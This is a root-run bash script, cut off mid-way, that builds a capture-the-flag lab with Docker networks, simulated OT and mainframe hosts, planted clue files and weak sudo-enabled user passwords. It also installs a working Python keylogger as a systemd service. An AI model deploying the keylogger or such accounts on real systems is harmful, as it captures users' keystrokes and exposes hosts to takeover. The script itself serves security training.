#!/bin/bash

# ==============================================================================
# GHOSTFRAME: OPERATION LEVIATHAN - The Frame Up
# ==============================================================================
# MASTER DEPLOYMENT SCRIPT - COMPLETE & UNABRIDGED
# This version integrates all narrative, adversary, OT, and mainframe elements
# into a single, cohesive, multi-stage experience. It features dynamic
# adversaries (with multiple defeat conditions), multiple plot lines, 
# and all original blackbox hacking fun. 
# ==============================================================================
# ==============================================================================
#
# !!! HIGH RISK WARNING !!!
# This script is designed for a dedicated, disposable, Debian-based VM.
# It grants a container control over the host's Docker daemon, handles an
# optional, sensitive API key, and requires user-provided files for the
# mainframe simulator. It is NOT for use on production systems.
#
# The creators assume NO RESPONSIBILITY for damage, data loss, or API charges.
# You have been warned.
# ==============================================================================

# --- Rigorous exit on error & Sudo Check ---
set -e
if [[ $EUID -ne 0 ]]; then
   echo "[FATAL] This script MUST be run with sudo or as root."
   exit 1
fi

# --- Centralized Configuration Block ---
PROJECT_DIR="/opt/leviathan_ctf"
GHOST_USER="ghost"
GHOST_PASS="ghost" # This password is a forensic clue
SHADOW_USER="shadow_op"
SHADOW_PASS="ZetaOverrideProtocol" # Puzzle-derived password
ENG_USER="eng_user"
ENG_PASS="2012Leviathan"
SKID_USER="skid_vicious"
SKID_PASS="n00bhaxor4eva" # Intentionally weak password
INSTALL_LOG_FILE="/tmp/leviathan_install.log"

# --- Network Details ---
CONTROL_NET_SUBNET="192.168.200.0/24"
DIRECTOR_IP="192.168.200.2"
DMZ_NET_SUBNET="172.16.10.0/24"
WEB_DMZ_IP="172.16.10.10"
SSH_JUMP_DMZ_IP="172.16.10.11"
SSH_JUMP_CONTROL_IP="192.168.200.11"
IT_CORP_NET_SUBNET="172.16.20.0/24"
FILESERV_IT_IP="172.16.20.20"
ENG_WORKSTATION_IP="172.16.20.50"
GIBSON_IP="172.16.20.100" # New Mainframe IP
OT_SECURE_NET_SUBNET="10.0.50.0/24"
PLC_SIM_IP="10.0.50.10"
HMI_DASH_IP="10.0.50.20"
SCADA_SERVER_IP="10.0.50.30"
HISTORIAN_DB_IP="10.0.50.40"
BLACKSWAN_NET_SUBNET="10.0.200.0/24"
BLACKSWAN_C2_IP="10.0.200.5"
TOR_SERVICE_IP="192.168.200.10"

# --- Flags ---
FLAG_PHASE1="FLAG{JUMPBOX_ACCESS_GHOST}"
FLAG_PHASE2="FLAG{SKID_VICIOUS_IDENTITY_CONFIRMED}"
FLAG_PHASE3="FLAG{CANARY_TRUST_ESTABLISHED_OT_PIVOT}"
FLAG_PHASE4="FLAG{ENGINEER_WORKSTATION_COMPROMISED_OT_ACCESS}"
FLAG_PHASE5="FLAG{LEVIATHAN_MELTDOWN_INITIATED_THE_FRAME_IS_SET}"
FLAG_PHASE6="FLAG{CYGNUS_C2_COMPROMISED_BLACKSWAN_DEFEATED}"
BONUS_FLAG="FLAG{SHADOW_OPERATIVE_UNMASKED_THE_FRAME_UP_IS_REAL}"

# --- AI & NPC Details ---
DIRECTOR_FLAG_PORT="9999"
CANARY_GHOST_PORT="4040"
CANARY_CODENAME="DeltaCharlie" # This clue is now on the Gibson mainframe
GEMINI_API_KEY=""

# --- Customization ---
GHOST_WALLPAPER_URL="https://images.steamusercontent.com/ugc/769492806534044558/50B71CD7DD2E0CD6B79097E1D13181D16EF047DB/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false"
GHOST_MUSIC_URL="https://soundcloud.com/ryzermelbourne/quick-demo"

# --- Function Definitions ---

# Ensure PROJECT_DIR exists from the start
echo "[DEBUG] Initial PROJECT_DIR check: $PROJECT_DIR"
if [ ! -d "$PROJECT_DIR" ]; then
    echo "[DEBUG] Creating base PROJECT_DIR: $PROJECT_DIR"
    mkdir -p "$PROJECT_DIR" || { echo "[ERROR] Failed to create base PROJECT_DIR"; exit 1; }
    echo "[DEBUG] Base PROJECT_DIR created successfully"
else
    echo "[DEBUG] Base PROJECT_DIR already exists"
fi

prompt_for_confirmation() {
    echo "==================== WARNING: DEFINITIVE DEPLOYMENT ==================="
    echo "You are about to deploy the complete, multi-stage GhostFrame CTF."
    echo ""
    echo "Use ONLY on a dedicated, disposable VM you are prepared to erase."
    echo "====================================================================="
    read -p "Type 'leviathan' to confirm and proceed with deployment: " confirmation
    if [[ "$confirmation" != "leviathan" ]]; then
        echo "Deployment aborted by user."
        exit 1
    fi
}

prompt_for_gemini_key() {
    echo "[*] CONFIGURATION: Optional Generative AI NPCs"
    echo "You can provide a Google Gemini API key to power the 'Canary' and 'SKID_VICIOUS' NPCs."
    echo "If you skip this, they will use robust, pre-scripted responses."
    read -p "Enter your Google Gemini API key (or press Enter to skip): " -s GEMINI_API_KEY
    echo
    if [ -n "$GEMINI_API_KEY" ]; then echo "[INFO] Gemini API key received."; else echo "[INFO] No API key provided."; fi
}

# ==============================================================================
# ENHANCED SECTIONS FOR GHOSTFRAME CTF SCRIPT
# Improvements: 3=Cleanup, 6=Structured Logging, 7=Network Tests, 8=Healthchecks
# ==============================================================================

# --- Enhanced Configuration with Logging ---
PROJECT_DIR="/opt/leviathan_ctf"
INSTALL_LOG_FILE="/tmp/leviathan_install.log"
CLEANUP_LOG_FILE="/tmp/leviathan_cleanup.log"
LOG_LEVEL="${LOG_LEVEL:-INFO}"  # DEBUG, INFO, WARN, ERROR

# --- Structured Logging Functions ---
log_debug() { [[ "$LOG_LEVEL" == "DEBUG" ]] && echo "[$(date '+%Y-%m-%d %H:%M:%S')] [DEBUG] $*" | tee -a "$INSTALL_LOG_FILE"; }
log_info() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $*" | tee -a "$INSTALL_LOG_FILE"; }
log_warn() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WARN] $*" | tee -a "$INSTALL_LOG_FILE"; }
log_error() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $*" | tee -a "$INSTALL_LOG_FILE"; }
log_fatal() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [FATAL] $*" | tee -a "$INSTALL_LOG_FILE"; exit 1; }

# --- Pre-flight Network Connectivity Tests ---
test_network_connectivity() {
    log_info "Running pre-flight network connectivity tests..."
    
    # Test internet connectivity
    if ! curl -s --connect-timeout 5 https://8.8.8.8 > /dev/null; then
        log_error "No internet connectivity detected. Some features may not work."
        return 1
    fi
    log_debug "Internet connectivity: OK"
    
    # Test Docker Hub connectivity
    if ! curl -s --connect-timeout 5 https://registry-1.docker.io > /dev/null; then
        log_warn "Docker Hub connectivity test failed. Container builds may be slow."
    else
        log_debug "Docker Hub connectivity: OK"
    fi
    
    # Test required external resources
    local test_urls=(
        "$GHOST_WALLPAPER_URL"
        "https://cdnjs.cloudflare.com"
    )
    
    for url in "${test_urls[@]}"; do
        if curl -s --connect-timeout 10 --head "$url" > /dev/null; then
            log_debug "External resource reachable: $url"
        else
            log_warn "External resource unreachable: $url (may cause cosmetic issues)"
        fi
    done
    
    # Test Docker daemon
    if ! docker info > /dev/null 2>&1; then
        log_fatal "Docker daemon is not running or accessible"
    fi
    log_debug "Docker daemon: OK"
    
    # Test Docker Compose
    if ! docker-compose version > /dev/null 2>&1; then
        log_fatal "Docker Compose is not installed or accessible"
    fi
    log_debug "Docker Compose: OK"
    
    log_info "Network connectivity tests completed"
    return 0
}

# --- Pre-flight System Resource Checks ---
check_system_resources() {
    log_info "Checking system resources..."
    
    # Check available disk space (require at least 5GB)
    local available_space_kb=$(df / | awk 'NR==2 {print $4}')
    local required_space_kb=$((5 * 1024 * 1024))  # 5GB in KB
    
    if [[ $available_space_kb -lt $required_space_kb ]]; then
        log_fatal "Insufficient disk space. Required: 5GB, Available: $(($available_space_kb / 1024 / 1024))GB"
    fi
    log_debug "Disk space check: OK ($(($available_space_kb / 1024 / 1024))GB available)"
    
    # Check available memory (require at least 4GB)
    local available_memory_kb=$(awk '/MemAvailable/ {print $2}' /proc/meminfo)
    local required_memory_kb=$((4 * 1024 * 1024))  # 4GB in KB
    
    if [[ $available_memory_kb -lt $required_memory_kb ]]; then
        log_warn "Low memory detected. Required: 4GB, Available: $(($available_memory_kb / 1024 / 1024))GB"
        log_warn "Installation may be slow or fail"
    else
        log_debug "Memory check: OK ($(($available_memory_kb / 1024 / 1024))GB available)"
    fi
    
    # Check if ports are available
    local required_ports=(80 2222 5000 8080 2023 2111 8081 8443 "$DIRECTOR_FLAG_PORT" "$CANARY_GHOST_PORT")
    local ports_in_use=()
    
    for port in "${required_ports[@]}"; do
        if netstat -tuln 2>/dev/null | grep -q ":$port "; then
            ports_in_use+=("$port")
        fi
    done
    
    if [[ ${#ports_in_use[@]} -gt 0 ]]; then
        log_warn "Ports already in use: ${ports_in_use[*]}"
        log_warn "This may cause service conflicts"
    else
        log_debug "Port availability check: OK"
    fi
    
    log_info "System resource checks completed"
}

# --- Container Health Check Functions ---
wait_for_container_health() {
    local container_name="$1"
    local max_wait="${2:-60}"
    local check_interval="${3:-2}"
    
    log_info "Waiting for container '$container_name' to become healthy..."
    
    local elapsed=0
    while [[ $elapsed -lt $max_wait ]]; do
        if docker ps --filter "name=$container_name" --filter "status=running" --format "{{.Names}}" | grep -q "^$container_name$"; then
            log_debug "Container '$container_name' is running"
            return 0
        fi
        
        sleep "$check_interval"
        elapsed=$((elapsed + check_interval))
        log_debug "Waiting for '$container_name'... (${elapsed}s/${max_wait}s)"
    done
    
    log_error "Container '$container_name' failed to start within ${max_wait}s"
    return 1
}

test_service_connectivity() {
    local service_name="$1"
    local host="$2"
    local port="$3"
    local max_attempts="${4:-10}"
    
    log_debug "Testing connectivity to $service_name ($host:$port)..."
    
    for attempt in $(seq 1 $max_attempts); do
        if timeout 5 bash -c "</dev/tcp/$host/$port" 2>/dev/null; then
            log_debug "$service_name connectivity: OK (attempt $attempt)"
            return 0
        fi
        sleep 2
    done
    
    log_warn "$service_name connectivity test failed after $max_attempts attempts"
    return 1
}

verify_container_deployment() {
    log_info "Verifying container deployment and connectivity..."
    
    # Wait for core containers
    local core_containers=("director" "web-dmz" "ssh-jump" "tor-exposed")
    for container in "${core_containers[@]}"; do
        if ! wait_for_container_health "$container" 120; then
            log_error "Critical container '$container' failed to start"
            return 1
        fi
    done
    
    # Test service connectivity
    local host_ip=$(hostname -I | awk '{print $1}')
    
    # Test web server
    if test_service_connectivity "Web DMZ" "$host_ip" "80"; then
        log_info "Web DMZ service: HEALTHY"
    else
        log_warn "Web DMZ service: UNHEALTHY"
    fi
    
    # Test SSH jumpbox
    if test_service_connectivity "SSH Jumpbox" "$host_ip" "2222"; then
        log_info "SSH Jumpbox service: HEALTHY"
    else
        log_warn "SSH Jumpbox service: UNHEALTHY"
    fi
    
    # Test director flag service
    if test_service_connectivity "Director Flag Service" "$DIRECTOR_IP" "$DIRECTOR_FLAG_PORT" 5; then
        log_info "Director Flag Service: HEALTHY"
    else
        log_warn "Director Flag Service: UNHEALTHY"
    fi
    
    log_info "Container deployment verification completed"
}

# --- Enhanced Cleanup Functions ---
cleanup_docker_resources() {
    log_info "Cleaning up Docker resources..."
    
    cd "$PROJECT_DIR" 2>/dev/null || true
    
    # Stop and remove containers
    if [[ -f "docker-compose.yml" ]]; then
        log_debug "Stopping docker-compose services..."
        docker-compose down --remove-orphans -v 2>/dev/null || log_warn "docker-compose down failed"
    fi
    
    # Remove any remaining containers with our naming pattern
    local containers=$(docker ps -aq --filter "name=leviathan" --filter "name=gibson" --filter "name=director" --filter "name=ssh-jump" --filter "name=web-dmz" --filter "name=tor-exposed" --filter "name=blackswan" 2>/dev/null)
    if [[ -n "$containers" ]]; then
        log_debug "Removing remaining containers..."
        docker rm -f $containers 2>/dev/null || log_warn "Failed to remove some containers"
    fi
    
    # Clean up networks
    local networks=$(docker network ls --filter "name=leviathan" --format "{{.Name}}" 2>/dev/null)
    if [[ -n "$networks" ]]; then
        log_debug "Removing Docker networks..."
        echo "$networks" | xargs -r docker network rm 2>/dev/null || log_warn "Failed to remove some networks"
    fi
    
    # Clean up volumes
    local volumes=$(docker volume ls --filter "name=leviathan" --format "{{.Name}}" 2>/dev/null)
    if [[ -n "$volumes" ]]; then
        log_debug "Removing Docker volumes..."
        echo "$volumes" | xargs -r docker volume rm 2>/dev/null || log_warn "Failed to remove some volumes"
    fi
    
    # Prune unused resources
    docker system prune -f --volumes 2>/dev/null || log_warn "Docker system prune failed"
    
    log_info "Docker cleanup completed"
}

cleanup_host_resources() {
    log_info "Cleaning up host resources..."
    
    # Stop and disable services
    local services=("ghost-logger.service")
    for service in "${services[@]}"; do
        if systemctl is-active --quiet "$service" 2>/dev/null; then
            log_debug "Stopping service: $service"
            systemctl stop "$service" 2>/dev/null || log_warn "Failed to stop $service"
        fi
        if systemctl is-enabled --quiet "$service" 2>/dev/null; then
            log_debug "Disabling service: $service"
            systemctl disable "$service" 2>/dev/null || log_warn "Failed to disable $service"
        fi
    done
    
    # Remove service files
    local service_files=("/etc/systemd/system/ghost-logger.service" "/usr/local/bin/ghost_logger.py")
    for file in "${service_files[@]}"; do
        if [[ -f "$file" ]]; then
            log_debug "Removing service file: $file"
            rm -f "$file" || log_warn "Failed to remove $file"
        fi
    done
    systemctl daemon-reload 2>/dev/null || true
    
    # Remove users
    local users=("$GHOST_USER" "$SHADOW_USER")
    for user in "${users[@]}"; do
        if id "$user" &>/dev/null; then
            log_debug "Removing user: $user"
            # Kill any running processes for the user
            pkill -u "$user" 2>/dev/null || true
            # Remove user and home directory
            userdel -r "$user" 2>/dev/null || log_warn "Failed to completely remove user $user"
        fi
    done
    
    # Remove project directory
    if [[ -d "$PROJECT_DIR" ]]; then
        log_debug "Removing project directory: $PROJECT_DIR"
        rm -rf "$PROJECT_DIR" || log_warn "Failed to remove project directory"
    fi
    
    # Clean up temporary files
    local temp_files=("/tmp/leviathan_install.log" "/tmp/leviathan_cleanup.log" "/tmp/installer_wrapper.py" "/tmp/leviathan_slides")
    for item in "${temp_files[@]}"; do
        if [[ -e "$item" ]]; then
            log_debug "Removing temporary item: $item"
            rm -rf "$item" 2>/dev/null || log_warn "Failed to remove $item"
        fi
    done
    
    log_info "Host cleanup completed"
}

create_cleanup_script() {
    log_info "Creating cleanup script..."
    
    cat > "/usr/local/bin/cleanup-ghostframe.sh" << 'CLEANUP_SCRIPT_EOF'
#!/bin/bash
set -e

# Source the logging functions and variables from the main script
PROJECT_DIR="/opt/leviathan_ctf"
CLEANUP_LOG_FILE="/tmp/leviathan_cleanup.log"
GHOST_USER="ghost"
SHADOW_USER="shadow_op"

# Copy the logging functions here (or source them if available)
log_info() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $*" | tee -a "$CLEANUP_LOG_FILE"; }
log_warn() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WARN] $*" | tee -a "$CLEANUP_LOG_FILE"; }
log_debug() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [DEBUG] $*" | tee -a "$CLEANUP_LOG_FILE"; }
log_error() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $*" | tee -a "$CLEANUP_LOG_FILE"; }

echo "=== GHOSTFRAME CTF CLEANUP UTILITY ==="
echo "This will completely remove all CTF components from this system."
read -p "Are you sure you want to proceed? (yes/no): " confirm

if [[ "$confirm" != "yes" ]]; then
    echo "Cleanup aborted."
    exit 0
fi

# Include the cleanup functions from above here
# (cleanup_docker_resources and cleanup_host_resources)

cleanup_docker_resources() {
    log_info "Cleaning up Docker resources..."
    cd "$PROJECT_DIR" 2>/dev/null || true
    if [[ -f "docker-compose.yml" ]]; then
        log_debug "Stopping docker-compose services..."
        docker-compose down --remove-orphans -v 2>/dev/null || log_warn "docker-compose down failed"
    fi
    local containers=$(docker ps -aq --filter "name=leviathan" --filter "name=gibson" --filter "name=director" --filter "name=ssh-jump" --filter "name=web-dmz" --filter "name=tor-exposed" --filter "name=blackswan" 2>/dev/null)
    if [[ -n "$containers" ]]; then
        log_debug "Removing remaining containers..."
        docker rm -f $containers 2>/dev/null || log_warn "Failed to remove some containers"
    fi
    local networks=$(docker network ls --filter "name=leviathan" --format "{{.Name}}" 2>/dev/null)
    if [[ -n "$networks" ]]; then
        log_debug "Removing Docker networks..."
        echo "$networks" | xargs -r docker network rm 2>/dev/null || log_warn "Failed to remove some networks"
    fi
    local volumes=$(docker volume ls --filter "name=leviathan" --format "{{.Name}}" 2>/dev/null)
    if [[ -n "$volumes" ]]; then
        log_debug "Removing Docker volumes..."
        echo "$volumes" | xargs -r docker volume rm 2>/dev/null || log_warn "Failed to remove some volumes"
    fi
    docker system prune -f --volumes 2>/dev/null || log_warn "Docker system prune failed"
    log_info "Docker cleanup completed"
}

cleanup_host_resources() {
    log_info "Cleaning up host resources..."
    local services=("ghost-logger.service")
    for service in "${services[@]}"; do
        if systemctl is-active --quiet "$service" 2>/dev/null; then
            log_debug "Stopping service: $service"
            systemctl stop "$service" 2>/dev/null || log_warn "Failed to stop $service"
        fi
        if systemctl is-enabled --quiet "$service" 2>/dev/null; then
            log_debug "Disabling service: $service"
            systemctl disable "$service" 2>/dev/null || log_warn "Failed to disable $service"
        fi
    done
    local service_files=("/etc/systemd/system/ghost-logger.service" "/usr/local/bin/ghost_logger.py")
    for file in "${service_files[@]}"; do
        if [[ -f "$file" ]]; then
            log_debug "Removing service file: $file"
            rm -f "$file" || log_warn "Failed to remove $file"
        fi
    done
    systemctl daemon-reload 2>/dev/null || true
    local users=("$GHOST_USER" "$SHADOW_USER")
    for user in "${users[@]}"; do
        if id "$user" &>/dev/null; then
            log_debug "Removing user: $user"
            pkill -u "$user" 2>/dev/null || true
            userdel -r "$user" 2>/dev/null || log_warn "Failed to completely remove user $user"
        fi
    done
    if [[ -d "$PROJECT_DIR" ]]; then
        log_debug "Removing project directory: $PROJECT_DIR"
        rm -rf "$PROJECT_DIR" || log_warn "Failed to remove project directory"
    fi
    local temp_files=("/tmp/leviathan_install.log" "/tmp/leviathan_cleanup.log" "/tmp/installer_wrapper.py" "/tmp/leviathan_slides")
    for item in "${temp_files[@]}"; do
        if [[ -e "$item" ]]; then
            log_debug "Removing temporary item: $item"
            rm -rf "$item" 2>/dev/null || log_warn "Failed to remove $item"
        fi
    done
    log_info "Host cleanup completed"
}

cleanup_docker_resources
cleanup_host_resources

echo "=== CLEANUP COMPLETED ==="
echo "All GhostFrame CTF components have been removed."
echo "Cleanup log: $CLEANUP_LOG_FILE"
CLEANUP_SCRIPT_EOF

    chmod +x "/usr/local/bin/cleanup-ghostframe.sh"
    log_info "Cleanup script created at /usr/local/bin/cleanup-ghostframe.sh"
}

install_host_dependencies() {
    echo "[*] Updating host package lists..."
    apt-get update
    echo "[*] Installing required packages..."
    apt-get install -y docker.io docker-compose git steghide python3-pip tree imagemagick wget dconf-cli mpv yt-dlp python3-tk python3-pil python3-pil.imagetk unzip
    echo "[*] Installing Python dependencies..."
    apt-get install -y python3-pynput
    echo "[INFO] Host dependencies installed."
}

populate_host_users_with_clues() {
    echo "[*] Creating users and seeding forensic clues on the host..."
    if id "$GHOST_USER" &>/dev/null; then echo "[INFO] User '$GHOST_USER' already exists."; else useradd -m -s /bin/bash -G sudo "$GHOST_USER"; fi
    echo "$GHOST_USER:$GHOST_PASS" | chpasswd
    GHOST_HOME="/home/$GHOST_USER"
    if id "$SHADOW_USER" &>/dev/null; then echo "[INFO] User '$SHADOW_USER' already exists."; else useradd -m -s /bin/bash "$SHADOW_USER"; fi
    echo "$SHADOW_USER:$SHADOW_PASS" | chpasswd
    SHADOW_HOME="/home/$SHADOW_USER"
    mkdir -p "$SHADOW_HOME/ops/mission_docs"
    touch "$SHADOW_HOME/ops/ghost_watch.log"; chmod 666 "$SHADOW_HOME/ops/ghost_watch.log"
    
    echo "[*] Planting mission clues and forensic artifacts in $GHOST_HOME..."
    mkdir -p "$GHOST_HOME/Documents"
    cat > "$GHOST_HOME/Documents/mission_briefing.txt" << EOF
OPERATIVE: GHOST. You have been activated. Infiltrate Acheron's network and access LEVIATHAN.
Another operative, 'shadow_op', is on this system. Their access is rumored to be related to the 'Zeta Override Protocol'.
Intel suggests there is an insider, an engineer codenamed 'Canary', who may be willing to help if you can find their secure contact protocol.
EOF

    mkdir -p "$GHOST_HOME/.local/share/keyrings"
    cat > "$GHOST_HOME/.local/share/keyrings/login.keyring" << EOF
[metadata]
display-name=Login
default=true
[entry]
label=System Login
user=ghost
password=$GHOST_PASS
EOF

    mkdir -p "$GHOST_HOME/Pictures"
    convert -size 600x300 xc:black -pointsize 20 -fill lime \
    -draw "rectangle 50,100 200,200" -draw "text 60,150 'Your VM'" \
    -draw "line 200,150 350,150" -draw "rectangle 350,100 550,200" \
    -draw "text 370,140 'Acheron Corp'" -draw "text 370,170 'Public Web Server'" \
    "$GHOST_HOME/Pictures/network_map.png"
    
    cat > "$GHOST_HOME/.bash_history" << EOF
ip a
ls -la /
cat /etc/hosts
sudo docker ps
tree /opt
nmap 127.0.0.1
EOF

    mkdir -p "$GHOST_HOME/.config/firefox/profiles/default"
    cat > "$GHOST_HOME/.config/firefox/profiles/default/places.sqlite.txt" << EOF
# Simulated browser history extract
1|https://www.google.com/search?q=how+to+find+my+ip+address+linux
2|https://www.google.com/search?q=how+to+find+web+server+on+my+network
3|https://www.google.com/search?q=nmap+scan+local+network
EOF

    echo "[*] Setting up desktop environment for user '$GHOST_USER'..."
#    wget -qO "$GHOST_HOME/Pictures/background.jpg" "$GHOST_WALLPAPER_URL"
#    if command -v gsettings &> /dev/null; then
#        su -c "export DISPLAY=:0; export DBUS_SESSION_BUS_ADDRESS='unix:path=/run/user/$(id -u ${GHOST_USER})/bus'; gsettings set org.gnome.desktop.background picture-uri 'file://$GHOST_HOME/Pictures/background.jpg'" -s /bin/sh "$GHOST_USER" || true
#    fi
#    mkdir -p "$GHOST_HOME/.config/autostart"
#    cat > "$GHOST_HOME/.config/autostart/background_music.desktop" << EOF
#[Desktop Entry]
#Type=Application
#Name=Background Ambience
#Exec=sh -c "mpv --no-terminal --no-video --loop=inf --volume=50 \\\$((yt-dlp -g '${GHOST_MUSIC_URL}') 2>/dev/null)"
#X-GNOME-Autostart-enabled=true
#EOF
    chown -R "$GHOST_USER":"$GHOST_USER" "$GHOST_HOME"
    chown -R "$SHADOW_USER":"$SHADOW_USER" "$SHADOW_HOME"
}

deploy_ghost_logger_service() {
    echo "[*] Deploying systemd keylogger service..."
    cat > "/usr/local/bin/ghost_logger.py" << 'EOF'
import os, time, sys
from pynput import keyboard
time.sleep(10)
log_file = "/home/shadow_op/ops/ghost_watch.log"
def on_press(key):
    try:
        if not os.path.exists(log_file):
             open(log_file, 'a').close()
             os.chown(log_file, os.stat("/home/shadow_op").st_uid, -1)
        with open(log_file, "a") as f: f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            if key == key.space: f.write(' ')
            elif key == key.enter: f.write('\n')
    except: pass
try:
    with keyboard.Listener(on_press=on_press) as listener: listener.join()
except: sys.exit(0)
EOF
    chmod +x "/usr/local/bin/ghost_logger.py"
    cat > "/etc/systemd/system/ghost-logger.service" << EOF
[Unit]
Description=Ghost Keystroke Logger Service
After=graphical.target
[Service]
User=$GHOST_USER
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/ghost_logger.py
Restart=always
Environment=DISPLAY=:0
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload; systemctl enable --now ghost-logger.service
    echo "[INFO] Keylogger service configured."
}

setup_project_directories() {
    echo "[*] Creating complete project directory structure at $PROJECT_DIR..."
    
    # Ensure PROJECT_DIR is set
    if [ -z "$PROJECT_DIR" ]; then
        echo "[ERROR] PROJECT_DIR is not set!"
        return 1
    fi
    
    echo "[DEBUG] PROJECT_DIR = $PROJECT_DIR"
    
    # Remove existing directory if it exists
    if [ -d "$PROJECT_DIR" ]; then
        echo "[DEBUG] Removing existing project directory..."
        rm -rf "$PROJECT_DIR"
    fi
    
    # Create directories with explicit error checking
    echo "[DEBUG] Creating project directories..."
    
    # Create base project directory first
    mkdir -p "$PROJECT_DIR" || { echo "[ERROR] Failed to create base project directory"; return 1; }
    
    # Create subdirectories with individual error checking
    local dirs=(
        "director"
        "web_dmz/www"
        "ssh_jump"
        "fileserv_it/shares/Admin-Notes"
        "fileserv_it/shares/temp-share"
        "gibson/data"
        "eng_workstation/projects"
        "leviathan-plc"
        "leviathan-hmi/www"
        "leviathan-scada"
        "leviathan-historian"
        "blackswan_c2/app"
        "tor_service/app/templates"
        "tor_service/app/static"
        "tor_service/hidden_service"
    )
    
    for dir in "${dirs[@]}"; do
        local full_path="$PROJECT_DIR/$dir"
        echo "[DEBUG] Creating directory: $full_path"
        mkdir -p "$full_path" || { echo "[ERROR] Failed to create directory: $full_path"; return 1; }
    done
    
    # Verify critical directories were created
    local critical_dirs=(
        "$PROJECT_DIR/director"
        "$PROJECT_DIR/web_dmz/www"
        "$PROJECT_DIR/ssh_jump"
        "$PROJECT_DIR/fileserv_it/shares/Admin-Notes"
        "$PROJECT_DIR/gibson/data"
    )
    
    for dir in "${critical_dirs[@]}"; do
        if [ ! -d "$dir" ]; then
            echo "[ERROR] Critical directory not created: $dir"
            return 1
        else
            echo "[DEBUG] Verified directory exists: $dir"
        fi
    done
    
    echo "[INFO] Project directories created successfully."
}

create_gibson_assets() {
    echo "[*] Generating Gibson Mainframe assets..."
    local GIBSON_DIR="$PROJECT_DIR/gibson"
    cat > "$GIBSON_DIR/Dockerfile" << 'EOF'
FROM python:3.9-slim-buster
WORKDIR /app
RUN apt-get update && apt-get install -y nmap hydra ncat c3270 x3270 unzip procps && rm -rf /var/lib/apt/lists/*
COPY gibson.zip .
RUN unzip gibson.zip && rm gibson.zip
WORKDIR /app/mfsim
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY start-gibson.sh .
RUN chmod +x start-gibson.sh
COPY ../data /data
EXPOSE 2023 2111 50000 50001 8081 8082 8443
CMD ["./start-gibson.sh"]
EOF
    cat > "$GIBSON_DIR/start-gibson.sh" << 'EOF'
#!/bin/bash
cd /app/mfsim || exit
python3 gibson-working.py -p 2023 &
sleep 2; python3 CICS.py &
sleep 1; python3 gibftpmulti.py --ftp 2111 &
sleep 1; python3 DB2.py &
sleep 2; python3 zos_rest_gateway.py &
sleep 1; python3 vuln_gateway.py &
sleep 3
echo "Gibson Mainframe Simulator is Running."
tail -f /dev/null
EOF
    # THIS IS THE CRITICAL CLUE
    cat > "$GIBSON_DIR/data/SYS.OPS.LOG" << EOF
== SYSTEM OPERATOR DAILY LOG ==
Automated migration tasks from legacy systems are running.
NOTE TO OPS: The engineer 'Canary' has established a new secure comms protocol.
To authenticate, use the codename: ${CANARY_CODENAME}
EOF
    echo ""
    echo "[*] Checking for Gibson mainframe files..."
    
    # Get the directory where this script is located
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    
    # Check if files exist in script directory and copy them
    if [ -f "$SCRIPT_DIR/gibson.zip" ] && [ -f "$SCRIPT_DIR/requirements.txt" ]; then
        echo "[INFO] Found Gibson files in script directory, copying to $GIBSON_DIR..."
        cp "$SCRIPT_DIR/gibson.zip" "$GIBSON_DIR/"
        cp "$SCRIPT_DIR/requirements.txt" "$GIBSON_DIR/"
        echo "[INFO] Gibson files copied successfully."
    elif [ -f "$GIBSON_DIR/gibson.zip" ] && [ -f "$GIBSON_DIR/requirements.txt" ]; then
        echo "[INFO] Gibson files already present in $GIBSON_DIR."
    else
        echo "[WARNING] Gibson files not found in script directory or $GIBSON_DIR."
        echo "[WARNING] Gibson mainframe will not be available. Continuing with other components..."
        # Create placeholder files to prevent Docker build errors
        echo "# Placeholder - replace with actual gibson.zip" > "$GIBSON_DIR/gibson.zip"
        echo "# Placeholder - replace with actual requirements.txt" > "$GIBSON_DIR/requirements.txt"
    fi
}

create_docker_assets() {
    echo "[*] Generating all container assets..."
    
    # Double-check that PROJECT_DIR is set
    if [ -z "$PROJECT_DIR" ]; then
        echo "[ERROR] PROJECT_DIR is not set in create_docker_assets!"
        return 1
    fi
    
    echo "[DEBUG] create_docker_assets: PROJECT_DIR = $PROJECT_DIR"
    
    # Check if directories already exist (they should from setup_project_directories)
    echo "[DEBUG] Checking if critical directories exist..."
    critical_dirs=(
        "$PROJECT_DIR/director"
        "$PROJECT_DIR/web_dmz/www"
        "$PROJECT_DIR/ssh_jump"
        "$PROJECT_DIR/fileserv_it/shares/Admin-Notes"
        "$PROJECT_DIR/gibson/data"
    )
    
    for dir in "${critical_dirs[@]}"; do
        if [ ! -d "$dir" ]; then
            echo "[ERROR] Critical directory missing: $dir"
            echo "[DEBUG] Attempting to create missing directory..."
            mkdir -p "$dir" || { echo "[ERROR] Failed to create missing directory: $dir"; return 1; }
        else
            echo "[DEBUG] Directory exists: $dir"
        fi
    done
    
    echo "[INFO] All critical directories verified."
    
    create_gibson_assets
    
    # SKID_VICIOUS Adversary Controller - ADVANCED VERSION
    cat > "$PROJECT_DIR/director/skid_controller.py" << EOF
import os, time, docker, random, requests
from enum import Enum
DOCKER_CONTAINER_NAME = "ssh-jump"
IT_NETWORK_CIDR = "172.16.20.0/24"
SABOTAGE_FILE = "/tmp/skid_test_write.tmp"
LOG_FILE = "/tmp/skid_log.txt"
DIRECTOR_URL = "http://director:5000/signal/skid_shutdown"
SKID_USER = "$SKID_USER"
class SkidState(Enum):
    STARTING = 1
    ACTIVE = 2
    NETWORK_BLOCKED = 3
    TOOLS_SABOTAGED = 4
    DEFEATED = 5
client = docker.from_env()
def get_container():
    try:
        container = client.containers.get(DOCKER_CONTAINER_NAME)
        return container if container.status == 'running' else None
    except docker.errors.NotFound:
        return None
def check_network_access(container):
    if not container: return False
    print("[SKID_CONTROLLER] Checking network access to IT corp net...")
